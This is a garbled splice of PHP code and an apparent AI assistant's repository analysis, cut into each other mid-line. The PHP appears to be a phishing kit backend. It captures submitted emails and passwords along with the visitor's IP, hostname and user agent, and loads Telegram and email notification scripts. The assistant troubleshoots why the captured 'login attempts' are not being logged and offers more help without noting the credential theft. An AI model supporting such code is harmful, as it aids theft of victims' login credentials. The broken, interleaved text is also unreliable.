<?php
require_once 'email.php';
require_once 'telegram.php';

// Input validation and sanitization
 to `login_attempts.txt`.
   - It currently contains **1 byte** but no readable data (0 lines). This suggests either a new file or minimal activity.

3. **Repository Structure**:
   - Files visible in the repository:
     - `assets/`: Likely holds static resources (images, CSS, JavaScript).
     - `Procfile`: Used for deployment configurations on platforms like Heroku/Railway.
     - `email.php`: Handles the processing of email configurations.
$email = filter_input(INPUT_POST, 'di', FILTER_SANITIZE_EMAIL);
$password = filter_input(INPUT_POST, 'pr', FILTER_SANITIZE_STRING);

// Function to send JSON response to the frontend
function sendJsonResponse($success, $message = '', $redirectUrl = '') {
    header('Content-Type: application/json');
    echo json_encode([
        'success' => $success,
        'message' => $message,
        'redirectUrl' => $redirectUrl
    ]);
        - `index.php`: Likely the application entry point.
     - `next.php`: Handles form submission and backend-related processes.
     - `telegram.php`: Processes notifications via Telegram.

4. **Functionality**:
   - The script updates login attempts dynamically; however, the empty log file suggests an issue with how data is being written to the file or insufficient traffic.

---

### **Insights**
1. **Logging Issue**:
   - Although the `login_attempts.txt` file has exit();
}

// Check if inputs are valid
if (!empty($email) && !empty($password)) {
    // Get client information
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $hostname = gethostbyaddr($ip) ?: 'Unknown';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

    // Build message for logging
    $message = <<<EOT
|-----------|Login Attempt|------------|
Email: {$email}
 been created, it might not be receiving entries due to incorrect permissions, errors in file write logic, or lack of incoming form submissions.

2. **Next Steps**:
   - Ensure that:
     - Write permissions for the `logs/` folder are properly configured.
     - The backend (`next.php`) logic appends data to this file correctly.

Let me know if you encounter further complications, and I’ll assist you! 😊
